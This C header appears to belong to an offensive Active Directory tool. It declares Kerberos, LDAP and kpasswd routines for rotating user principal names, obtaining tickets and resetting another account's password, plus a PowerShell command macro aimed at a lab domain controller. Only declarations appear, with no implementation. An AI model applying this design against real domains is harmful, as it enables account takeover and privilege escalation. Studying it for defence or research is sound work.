/***********************************************************************************************************************
*                                                                                                                       *
*   MODULO:        resetnightmare.h                                                                                     *
*   DESCRIPCION:   Contrato interno de ASN.1, Kerberos, criptografia, LDAP y kpasswd.                                  *
*                                                                                                                       *
***********************************************************************************************************************/

#ifndef RESETNIGHTMARE_H
#define RESETNIGHTMARE_H

#define SECURITY_WIN32
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winldap.h>
#include <dsgetdc.h>
#include <ntsecapi.h>
#include <security.h>
#include <lm.h>
#include <stdio.h>
#include <string.h>

/***********************************************************************************************************************
*                                               CONSTANTES DE PROTOCOLO                                                *
***********************************************************************************************************************/

#define KRB_MAX_TCP_RESPONSE		  ( 16U * 1024U * 1024U )
#define KRB_SOCKET_TIMEOUT_MS		  10000
#define KRB_PROTOCOL_VERSION		  5
#define KRB_TICKET_MESSAGE			  1
#define KRB_AUTHENTICATOR_MESSAGE	  2
#define KRB_ENC_AS_REP_PART			  25
#define KRB_ENC_CRED_PART_MESSAGE	  29
#define KRB_DEFAULT_TICKET_LIFETIME	  3600
#define KRB_KDC_PORT				  "88"
#define KRB_ERR_PREAUTH_REQUIRED	  25
#define KRB_DEFAULT_S2K_ITERATIONS	  4096UL
#define KRB_MAX_S2K_ITERATIONS		  1000000UL
#define KRB_MAX_ETYPE_INFO2_SIZE	  65536
#define KRB_MAX_SALT_SIZE			  1024
#define KRB_DIRECTORY_SETTLE_MS		  1000UL
#define KRB_KPASSWD_PORT			  "464"
#define KRB_KPASSWD_VERSION			  0xFF80
#define KRB_KPASSWD_RESPONSE_VERSION  1
#define KRB_KPASSWD_HEADER_SIZE		  6
#define KRB_KPASSWD_RESULT_SUCCESS	  0
#define KRB_KPASSWD_AUTH_ERROR		  3
#define KRB_KPASSWD_ACCESS_DENIED	  5
#define KRB_PRIV_MESSAGE			  21
#define KRB_ENC_PRIV_PART_MESSAGE	  28
#define KRB_ADDRESS_DIRECTIONAL		  3
#define KRB_AP_OPTION_MUTUAL_REQUIRED 0x20000000

#define RN_ACCOUNT_CCH	256
#define RN_DN_CCH		1024
#define RN_PASSWORD_CCH 512
#define RN_UPN_CCH		1025

#define RN_DEFAULT_ETYPE			"AES256"
#define RN_DEFAULT_NAMING_CONTEXT	"defaultNamingContext"
#define RN_USER_PRINCIPAL_NAME		"userPrincipalName"
#define RN_TICKET_GRANTING_SERVICE	"krbtgt"
#define RN_KADMIN_SERVICE			"kadmin"
#define RN_CHANGE_PASSWORD_INSTANCE "changepw"

#define KRB_KEY_USAGE_AS_REQ_PA_ENC_TIMESTAMP 1
#define KRB_KEY_USAGE_AS_REP_AES			  3
#define KRB_KEY_USAGE_AS_REP_RC4			  8
#define KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR	  11
#define KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART 13

#define KERB_AS_REQ 10
#define KERB_AS_REP 11
#define KERB_AP_REQ 14
#define KERB_CRED	22
#define KERB_ERROR	30

#define PADATA_ENC_TIMESTAMP  2
#define PADATA_ETYPE_INFO2	  19
#define PADATA_PA_PAC_REQUEST 128

#define KRB_KDC_OPTION_RENEWABLE_OK 0x00000010
#define KRB_KDC_OPTION_RENEWABLE	0x00800000
#define KRB_KDC_OPTION_FORWARDABLE	0x40000000

#define PRINCIPAL_NT_PRINCIPAL	1
#define PRINCIPAL_NT_SRV_INST	2
#define PRINCIPAL_NT_ENTERPRISE 10

#define ASN_UNIVERSAL		 0
#define ASN_APPLICATION		 1
#define ASN_CONTEXT			 2
#define ASN_BOOLEAN			 1
#define ASN_INTEGER			 2
#define ASN_BIT_STRING		 3
#define ASN_OCTET_STRING	 4
#define ASN_SEQUENCE		 16
#define ASN_GENERALIZED_TIME 24
#define ASN_GENERAL_STRING	 27

#define ASN_MAX_NESTING_DEPTH 64
#define ASN_MAX_SUBELEMENTS	  65536

#define KRB_ETYPE_AES128_CTS_HMAC_SHA1 17
#define KRB_ETYPE_AES256_CTS_HMAC_SHA1 18
#define KRB_ETYPE_RC4_HMAC			   23

#define COMANDO                                                                                                        \
	"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -NoExit -Command Get-ChildItem "        \
	"\\\\dc01.jellybeelab.local\\sysvol"

#define NT_SUCCESS( Status ) ( ( ( NTSTATUS )( Status ) ) >= 0 )

/***********************************************************************************************************************
*                                                MODELO DE DATOS KERBEROS                                              *
***********************************************************************************************************************/

typedef struct _ASN_ELEMENT
{
	PBYTE				 pbObject;
	BOOL				 bOwnsObject;
	BOOL				 bConstructed;
	INT					 cbObjectCapacity;
	INT					 iObjectOffset;
	INT					 cbObject;
	INT					 iValueOffset;
	INT					 cbValue;
	BOOL				 bHasEncodedHeader;
	INT					 iTagClass;
	INT					 iTagValue;
	struct _ASN_ELEMENT *pSubElements;
	INT					 cSubElements;
} ASN_ELEMENT, *PASN_ELEMENT;

typedef struct _KERBEROS_TIME
{
	BOOL bIsSet;
	INT	 iYear;
	INT	 iMonth;
	INT	 iDay;
	INT	 iHour;
	INT	 iMinute;
	INT	 iSecond;
} KERBEROS_TIME, *PKERBEROS_TIME;

typedef struct _ENCRYPTED_DATA
{
	INT	  iEtype;
	UINT  uiKvno;
	INT	  cbCipher;
	PBYTE pbCipher;
} ENCRYPTED_DATA, *PENCRYPTED_DATA;

typedef struct _PRINCIPAL_NAME
{
	LONG   lNameType;
	INT	   cNames;
	PCHAR *ppszNames;
} PRINCIPAL_NAME, *PPRINCIPAL_NAME;

typedef struct _KERBEROS_TICKET
{
	INT			   iTicketVersion;
	PCHAR		   pszRealm;
	PRINCIPAL_NAME stServiceName;
	ENCRYPTED_DATA stEncryptedPart;
} KERBEROS_TICKET, *PKERBEROS_TICKET;

typedef struct _KDC_REQUEST_BODY
{
	PRINCIPAL_NAME stClientName;
	PRINCIPAL_NAME stServiceName;
	PCHAR		   pszRealm;
	UINT		   uiOptions;
	UINT		   uiLifetime;
	UINT		   uiNonce;
	INT			   iEtype;
} KDC_REQUEST_BODY, *PKDC_REQUEST_BODY;

typedef struct _KERB_PA_PAC_REQUEST
{
	BOOL bIncludePac;
} KERB_PA_PAC_REQUEST, *PKERB_PA_PAC_REQUEST;

typedef struct _PA_DATA
{
	UINT  uiType;
	PVOID pvValue;
} PA_DATA, *PPA_DATA;

typedef struct _ENCRYPTION_KEY
{
	INT	  iKeyType;
	INT	  cbKey;
	PBYTE pbKey;
} ENCRYPTION_KEY, *PENCRYPTION_KEY;

typedef CONST ENCRYPTION_KEY *PCENCRYPTION_KEY;

typedef struct _ENC_KDC_REP_PART
{
	ENCRYPTION_KEY stKey;
	UINT		   uiNonce;
	UINT		   uiFlags;
	KERBEROS_TIME  stAuthTime;
	KERBEROS_TIME  stStartTime;
	KERBEROS_TIME  stEndTime;
	KERBEROS_TIME  stRenewUntil;
	PCHAR		   pszRealm;
	PRINCIPAL_NAME stServiceName;
} ENC_KDC_REP_PART, *PENC_KDC_REP_PART;

typedef struct _KRB_CRED_INFO
{
	ENCRYPTION_KEY stKey;
	PCHAR		   pszClientRealm;
	PRINCIPAL_NAME stClientName;
	UINT		   uiFlags;
	KERBEROS_TIME  stAuthTime;
	KERBEROS_TIME  stStartTime;
	KERBEROS_TIME  stEndTime;
	KERBEROS_TIME  stRenewUntil;
	PCHAR		   pszServiceRealm;
	PRINCIPAL_NAME stServiceName;
} KRB_CRED_INFO, *PKRB_CRED_INFO;

typedef struct _ENC_KRB_CRED_PART
{
	INT			   cTickets;
	PKRB_CRED_INFO pTicketInfo;
} ENC_KRB_CRED_PART, *PENC_KRB_CRED_PART;

typedef struct _KRB_CRED
{
	LONG			  lProtocolVersion;
	LONG			  lMessageType;
	INT				  cTickets;
	PKERBEROS_TICKET  pTickets;
	ENC_KRB_CRED_PART stEncryptedPart;
} KRB_CRED, *PKRB_CRED;

typedef struct _KERBEROS_AUTHENTICATOR
{
	LONG		   lVersion;
	PCHAR		   pszClientRealm;
	PRINCIPAL_NAME stClientName;
	LONG		   lMicroseconds;
	KERBEROS_TIME  stClientTime;
	BOOL		   bHasSubkey;
	ENCRYPTION_KEY stSubkey;
	BOOL		   bHasSequence;
	UINT		   uiSequence;
} KERBEROS_AUTHENTICATOR, *PKERBEROS_AUTHENTICATOR;

typedef struct _AS_REQ
{
	LONG			 lProtocolVersion;
	LONG			 lMessageType;
	INT				 cPaData;
	PPA_DATA		 pPaData;
	KDC_REQUEST_BODY stRequestBody;
} AS_REQ, *PAS_REQ;

typedef struct _KDC_REP
{
	PCHAR			pszClientRealm;
	PRINCIPAL_NAME	stClientName;
	KERBEROS_TICKET stTicket;
	ENCRYPTED_DATA	stEncryptedPart;
} KDC_REP, *PKDC_REP;

typedef struct _AP_REQ
{
	LONG				   lProtocolVersion;
	LONG				   lMessageType;
	UINT				   uiApOptions;
	KERBEROS_TICKET		   stTicket;
	KERBEROS_AUTHENTICATOR stAuthenticator;
	ENCRYPTION_KEY		   stKey;
	INT					   iKeyUsage;
} AP_REQ, *PAP_REQ;

typedef enum _UPN_ROTATION_STATE
{
	UPN_ROTATION_ORIGINAL = 0,
	UPN_ROTATION_CONTROLLED_OWNS_ALIAS,
	UPN_ROTATION_CONTROLLED_CLEARED
} UPN_ROTATION_STATE, *PUPN_ROTATION_STATE;

/***********************************************************************************************************************
*                                             CONTRATOS ENTRE MODULOS                                                  *
***********************************************************************************************************************/

BOOL execAsPrivUser( PCSTR pszUsername, PCSTR pszDomain, PCSTR pszPassword, PCSTR pszCommand );

PVOID memAlloc( SIZE_T cbData );
PVOID memClone( LPCVOID pvSource, SIZE_T cbData );
PCHAR stringClone( PCSTR pszSource );
BOOL  stringCopy( PCHAR pszDestination, SIZE_T cchDestination, PCSTR pszSource );
VOID  releasePrincipalName( PPRINCIPAL_NAME pName );
VOID  asnRelease( PASN_ELEMENT pElement );
BOOL  asnEncode( PASN_ELEMENT pElement, PBYTE *ppbData, PINT pcbData );
BOOL  asnDecode( PBYTE pbData, INT cbData, PASN_ELEMENT pElement );
BOOL  asnHasTag( PASN_ELEMENT pElement, INT iTagClass, INT iTagValue );
BOOL  asnGetInteger( PASN_ELEMENT pElement, PLONG plValue );
BOOL  asnGetOctetString( PASN_ELEMENT pElement, PBYTE *ppbData, PINT pcbData );
BOOL  asnGetString( PASN_ELEMENT pElement, PCHAR *ppszValue );
BOOL  asnGetPrincipalName( PASN_ELEMENT pElement, PPRINCIPAL_NAME pName );
BOOL  asnGetEncryptedData( PASN_ELEMENT pElement, PENCRYPTED_DATA pData );
BOOL  asnGetTicket( PASN_ELEMENT pElement, PKERBEROS_TICKET pTicket );
BOOL  asnGetEncKDCRepPart( PASN_ELEMENT pElement, PENC_KDC_REP_PART pPart );
BOOL  asnMakeSequence( PASN_ELEMENT pElements, INT cElements, PASN_ELEMENT pOutput );
BOOL  asnMakeExplicit( INT iTagClass, INT iTagValue, PASN_ELEMENT pValue, PASN_ELEMENT pOutput );
BOOL  asnPackInteger( INT iTagValue, INT iValue, PASN_ELEMENT pContext );
BOOL  asnPackUnsignedInteger( INT iTagValue, UINT uiValue, PASN_ELEMENT pContext );
BOOL  asnPackOctetString( INT iTagValue, CONST BYTE *pbData, INT cbData, PASN_ELEMENT pContext );
BOOL  asnCreateEncryptedTimestampPaData( PCENCRYPTION_KEY pKey, PPA_DATA pPaData );
BOOL  asnBuildEncryptedData( PENCRYPTED_DATA pData, PASN_ELEMENT pOutput );
BOOL  asnBuildApRequest( PAP_REQ pRequest, PASN_ELEMENT pOutput );
BOOL  asnBuildKrbCredential( PKRB_CRED pCredential, PASN_ELEMENT pOutput );
BOOL  asnBuildAsRequest( PAS_REQ pRequest, PASN_ELEMENT pOutput );
BOOL  getKerberosTime( UINT uiSecondsFromNow, PKERBEROS_TIME pTime, PLONG plMicroseconds );

BOOL  kerberosEncrypt( CONST BYTE *pbInput, INT cbInput, PCENCRYPTION_KEY pKey, INT iKeyUsage, PBYTE *ppbOutput,
					   PINT pcbOutput );
BOOL  kerberosDecrypt( CONST BYTE *pbInput, INT cbInput, PCENCRYPTION_KEY pKey, INT iKeyUsage, PBYTE *ppbOutput,
					   PINT pcbOutput );
PCHAR base64Encode( CONST BYTE *pbInput, SIZE_T cbInput );
BOOL  getPasswordKey( PCSTR pszPassword, PCSTR pszSalt, ULONG ulIterations, INT iEtype, PENCRYPTION_KEY pKey );
VOID  releaseEncryptionKey( PENCRYPTION_KEY pKey );
VOID  releaseEncryptedData( PENCRYPTED_DATA pData );

BOOL sendKerberosRequest( PCSTR pszServer, PCSTR pszPort, LPCVOID pvContent, INT cbContent, PBYTE *ppbResponse,
						  PINT pcbResponse );
BOOL encodeKrbCred( PKRB_CRED pCredential, PBYTE *ppbTicket );
BOOL parseEtype( PCSTR pszValue, PINT piEtype );
BOOL askAsTicketWithPasswordForPrincipal( PCSTR pszRequestPrincipal, PCSTR pszSaltPrincipal, PCSTR pszDomain,
										  PCSTR pszPassword, PCSTR pszDc, INT iCredentialEtype, INT iRequestedEtype,
										  BOOL bEnterprise, PCSTR pszServiceClass, PCSTR pszServiceInstance,
										  PKRB_CRED pCredential );
BOOL askTgtWithPasswordForPrincipal( PCSTR pszRequestPrincipal, PCSTR pszSaltPrincipal, PCSTR pszDomain,
									 PCSTR pszPassword, PCSTR pszDc, INT iEtype, BOOL bEnterprise,
									 PKRB_CRED pCredential );
BOOL getKrbCredIdentity( PKRB_CRED pCredential, PCHAR pszPrincipal, SIZE_T cchPrincipal, PCHAR pszRealm,
						 SIZE_T cchRealm );
BOOL krbCredHasService( PKRB_CRED pCredential, PCSTR pszRealm, PCSTR pszServiceClass, PCSTR pszServiceInstance );
VOID releaseKrbCred( PKRB_CRED pCredential );
VOID releaseBase64Ticket( PBYTE *ppbTicket );

BOOL changePasswordRfc3244( PKRB_CRED pCredential, PCSTR pszDc, PCSTR pszPassword, PUSHORT pusResult );

BOOL baseDnToRealm( PCSTR pszBaseDn, PCHAR pszRealm, SIZE_T cchRealm );
BOOL modifyUserPrincipalName( LDAP *pLdap, PCSTR pszDn, PCSTR pszUpn );
BOOL upnHasExpectedOwner( LDAP *pLdap, PCSTR pszBaseDn, PCSTR pszUpn, PCSTR pszExpectedDn );
BOOL findUniqueUserBySamAccountName( LDAP *pLdap, PCSTR pszBaseDn, PCSTR pszAccount, PCHAR pszDn, SIZE_T cchDn,
									 PCHAR pszUpn, SIZE_T cchUpn );
BOOL hasRestoredUpnState( LDAP *pLdap, PCSTR pszBaseDn, PCSTR pszTargetUpn, PCSTR pszControlledUpn,
						  PCSTR pszControlledDn );
BOOL restoreControlledUpn( LDAP *pLdap, PCSTR pszControlledDn, PCSTR pszControlledUpn, PUPN_ROTATION_STATE pState );

typedef CONST UNICODE_STRING *PCUNICODE_STRING;
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_INITIALIZE )( LPCVOID, ULONG, ULONG, PVOID * );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_ENCRYPT )( PVOID, LPCVOID, ULONG, PVOID, PULONG );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_DECRYPT )( PVOID, LPCVOID, ULONG, PVOID, PULONG );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_FINISH )( PVOID * );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_HASHPASSWORD_NT5 )( PCUNICODE_STRING, PVOID );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_HASHPASSWORD_NT6 )( PCUNICODE_STRING, PCUNICODE_STRING, ULONG, PVOID );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_RANDOMKEY )( LPCVOID, ULONG, PVOID );
typedef NTSTATUS( WINAPI *PKERB_ECRYPT_CONTROL )( ULONG, PVOID, PUCHAR, ULONG );

typedef struct _KERB_ECRYPT
{
	ULONG					ulEncryptionType;
	ULONG					cbBlock;
	ULONG					ulExportableEncryptionType;
	ULONG					cbKey;
	ULONG					cbHeader;
	ULONG					ulPreferredChecksum;
	ULONG					ulAttributes;
	PCWSTR					pwszName;
	PKERB_ECRYPT_INITIALIZE pfnInitialize;
	PKERB_ECRYPT_ENCRYPT	pfnEncrypt;
	PKERB_ECRYPT_DECRYPT	pfnDecrypt;
	PKERB_ECRYPT_FINISH		pfnFinish;
	union
	{
		PKERB_ECRYPT_HASHPASSWORD_NT5 pfnHashPasswordNt5;
		PKERB_ECRYPT_HASHPASSWORD_NT6 pfnHashPasswordNt6;
	};
	PKERB_ECRYPT_RANDOMKEY pfnRandomKey;
	PKERB_ECRYPT_CONTROL   pfnControl;
	PVOID				   pvUnknown0;
	PVOID				   pvUnknown1;
	PVOID				   pvUnknown2;
} KERB_ECRYPT, *PKERB_ECRYPT;

NTSTATUS WINAPI RtlAnsiStringToUnicodeString( PUNICODE_STRING, STRING *, BOOLEAN );
VOID NTAPI		RtlFreeUnicodeString( PUNICODE_STRING );
VOID NTAPI		RtlInitAnsiString( STRING *, PCSTR );
NTSTATUS WINAPI CDLocateCSystem( ULONG, PKERB_ECRYPT * );
BOOLEAN WINAPI	SystemFunction036( PVOID, ULONG );

#endif
